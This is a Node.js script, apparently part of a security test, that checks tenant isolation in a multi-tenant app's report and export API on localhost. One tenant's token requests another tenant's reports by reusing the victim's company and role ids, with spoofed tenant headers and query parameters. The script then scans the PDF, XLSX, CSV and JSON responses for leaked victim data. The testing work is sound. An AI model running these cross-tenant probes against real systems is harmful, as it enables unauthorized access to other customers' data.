// Tenant isolation attack on the report and print surface: the victim (alnoor) prints everything first,
// then the attacker (gulfsteel) asks for the same addresses with the victim's ids and tenant headers.
import fs from 'node:fs';
import * as pdfjs from 'pdfjs-dist/legacy/build/pdf.mjs';
import { unzipSync, strFromU8 } from 'fflate';
const B = 'http://localhost:20650', OUT = '/home/shan/evidence-staging/p06-form-report/r3';
const tok = f => fs.readFileSync(`${OUT}/tok-${f}.txt`, 'utf8').trim();
const victim = tok('admin-alnoor.example'), attacker = tok('admin-gulfsteel.example');
const V = { tenantId: null, companies: ['018dca08-f08c-7511-8908-1621e033e7ef', '018dca08-f081-79ec-8741-97eafd0562a4', '018dca08-f085-7542-af56-a574b8de3616', '018dca08-f088-7685-969e-c31713b6f8ef'],
  roles: ['01a11c33-9f1e-7d43-809a-b9954c6b3a61', '01a11c34-4c7e-765a-896c-983ac0c714ab', '01a11c33-9f1e-7ecc-9d0d-1e5a2ae00a05', '01a11c33-9f1f-7193-bed7-d69e2f3c5779'] };
const sess = await (await fetch(B + '/api/auth/session', { headers: { authorization: 'Bearer ' + victim } })).json();
V.tenantId = sess.tenant?.id || sess.user?.tenantId; V.tenantCode = sess.tenant?.code || 'alnoor';
const markers = ['alnoor', 'Al Noor', 'النور', 'ALN-', 'DEIRA-HQ', 'JAFZA', '100123456700003', 'DED-604112', ...V.companies, ...V.roles];
const urls = [];
for (const lang of ['en', 'ar']) for (const fmt of ['json', 'pdf', 'csv', 'xlsx']) {
  const q = `format=${fmt}&language=${lang}`;
  for (const c of V.companies) { urls.push(`/api/reports/run/tenancy.companyProfile?company=${c}&${q}`); urls.push(`/api/reports/run/tenancy.branchDirectory?company=${c}&${q}`); urls.push(`/api/reports/run/identity.usersByRole?company=${c}&${q}`); }
  for (const r of V.roles) urls.push(`/api/reports/run/identity.usersByRole?role=${r}&${q}`);
  urls.push(`/api/reports/run/tenancy.branchDirectory?${q}`, `/api/reports/run/identity.usersByRole?${q}`, `/api/reports/run/identity.roleSummary?${q}`);
  for (const l of ['tenancy.companies', 'tenancy.branches', 'tenancy.access', 'identity.users', 'identity.roles']) {
    urls.push(`/api/reports/lists/${l}?${q}`, `/api/reports/lists/${l}?search=Noor&${q}`, `/api/reports/lists/${l}?search=ALN&${q}`);
  }
  urls.push(`/api/reports/lists/identity.users?filter=${encodeURIComponent('roles in ("' + V.roles[1] + '")')}&${q}`);
}
async function text(res, fmt) {
  const buf = new Uint8Array(await res.arrayBuffer());
  const hdr = [...res.headers].map(([k, v]) => `${k}: ${decodeURIComponent(v)}`).join('\n');
  let body = '';
  try {
    if (fmt === 'pdf' && res.status === 200) { const d = await pdfjs.getDocument({ data: buf, verbosity: 0 }).promise; for (let i = 1; i <= Math.min(d.numPages, 5); i++) body += (await (await d.getPage(i)).getTextContent()).items.map(t => t.str).join(' ') + '\n'; body += '\n' + Buffer.from(buf).toString('latin1'); }
    else if (fmt === 'xlsx' && res.status === 200) { const z = unzipSync(buf); body = Object.values(z).map(strFromU8).join('\n'); }
    else body = Buffer.from(buf).toString('utf8');
  } catch (e) { body = 'PARSE ' + e.message + Buffer.from(buf).toString('utf8'); }
  return hdr + '\n' + body;
}
let stats = {}, leaks = [];
// victim prints first
for (const u of urls) await fetch(B + u, { headers: { authorization: 'Bearer ' + victim } }).then(r => r.arrayBuffer());
const variants = [ {}, { 'X-Tenant-Id': V.tenantId, 'X-Tenant': V.tenantCode }, { 'X-Tenant-Id': V.tenantId, 'X-Company-Id': V.companies[1], 'Accept-Language': 'ar' } ];
for (const u of urls) for (const [vi, h] of variants.entries()) {
  const fmt = new URL(B + u).searchParams.get('format');
  const res = await fetch(B + u + (vi === 2 ? `&tenant=${V.tenantCode}&tenantId=${V.tenantId}` : ''), { headers: { authorization: 'Bearer ' + attacker, ...h } });
  stats[res.status] = (stats[res.status] || 0) + 1;
  const t = await text(res, fmt);
  const own = t;
  const hit = markers.filter(m => own.includes(m));
  if (hit.length) leaks.push(`${res.status} ${u} v${vi}: ${hit.join(', ')}`);
}
const report = `victim tenant ${V.tenantId}; ${urls.length} addresses x ${variants.length} variants; statuses ${JSON.stringify(stats)}\nleaks: ${leaks.length}\n${leaks.slice(0, 50).join('\n')}`;
fs.writeFileSync(`${OUT}/api/attack-report-print-surface.txt`, report); console.log(report);
